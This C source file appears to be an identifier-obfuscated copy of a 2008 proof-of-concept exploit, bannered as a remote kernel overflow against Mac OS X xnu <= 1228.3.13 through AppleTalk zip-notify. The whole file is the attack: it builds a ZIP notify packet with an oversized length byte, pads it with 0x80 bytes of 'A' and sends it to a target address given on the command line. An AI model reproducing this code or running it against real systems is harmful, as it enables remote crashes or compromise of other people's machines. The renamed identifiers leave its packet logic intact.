
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_at {int sat_port; int sat_family; int sat_addr; } ;
struct sockaddr {int dummy; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (char*,int *) ;
 int FUNC_1 (int ) ;
 int FUNC_2 (int ,char*,...) ;
 int FUNC_3 (char*,char*,int) ;
 int FUNC_4 (char*,int,int) ;
 int FUNC_5 (struct sockaddr_at*,int *) ;
 scalar_t__ FUNC_6 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_7 (char*,...) ;
 int VAR_5 ;
 int FUNC_8 (char*) ;

int
FUNC_9 (int VAR_6, char **VAR_7)
{
  struct sockaddr_at VAR_8, VAR_9;
  char *VAR_10, VAR_11[1024];
  int VAR_12, VAR_13;

  FUNC_7 ("Apple MACOS X xnu <= 1228.3.13 appletalk zip-notify remote kernel overflow PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (VAR_6 < 3)
    {
      FUNC_2 (VAR_5, "Usage: %s <dst addr> <zone> [src addr]\n", VAR_7[0]);
      FUNC_1 (VAR_2);
    }

  if (!FUNC_0 (VAR_7[1], &VAR_8.sat_addr))
    {
      FUNC_2 (VAR_5, "* dst address: atalk_aton failed\n");
      FUNC_1 (VAR_2);
    }

  if (VAR_6 > 3)
    {
      if (!FUNC_0 (VAR_7[3], &VAR_9.sat_addr))
        {
          FUNC_2 (VAR_5, "* src address: atalk_aton failed\n");
          FUNC_1 (VAR_2);
        }
    }

  VAR_8.sat_family = VAR_0;
  VAR_8.sat_port = 6;

  if ((VAR_12 = FUNC_5 (VAR_6 > 3 ? &VAR_9
                                  : ((void*)0), ((void*)0))) < 0)
    {
      FUNC_2 (VAR_5, "* netddp_open failed\n");
      FUNC_1 (VAR_2);
    }

  FUNC_7 ("Appletalk dst: %s, ", VAR_7[1]);
  if (VAR_6 > 3)
    FUNC_7 ("src: %s, ", VAR_7[3]);
  FUNC_7 ("zone: %s... ", VAR_7[2]);

  VAR_10 = VAR_11;
  *VAR_10++ = VAR_1;
  *VAR_10++ = VAR_4;
  *VAR_10++ = 0x00;

  *VAR_10++ = 0x00;
  *VAR_10++ = 0x00;
  *VAR_10++ = 0x00;
  *VAR_10++ = 0x00;

  VAR_13 = FUNC_8 (VAR_7[2]);
  *VAR_10++ = VAR_13;
  FUNC_3 (VAR_10, VAR_7[2], VAR_13);
  VAR_10 += VAR_13;

  *VAR_10++ = 0x80;



  FUNC_4 (VAR_10, 0x41, 0x80);
  VAR_10 += 0x80;

  if (FUNC_6 (VAR_12, VAR_11, VAR_10 - VAR_11, 0, (struct sockaddr *) &VAR_8,
                                          sizeof (struct sockaddr_at)) < 0)
    {
      FUNC_2 (VAR_5, "* netddp_sendto failed\n");
      FUNC_1 (VAR_2);
    }
  FUNC_7 ("done\n");

  return (VAR_3);
}
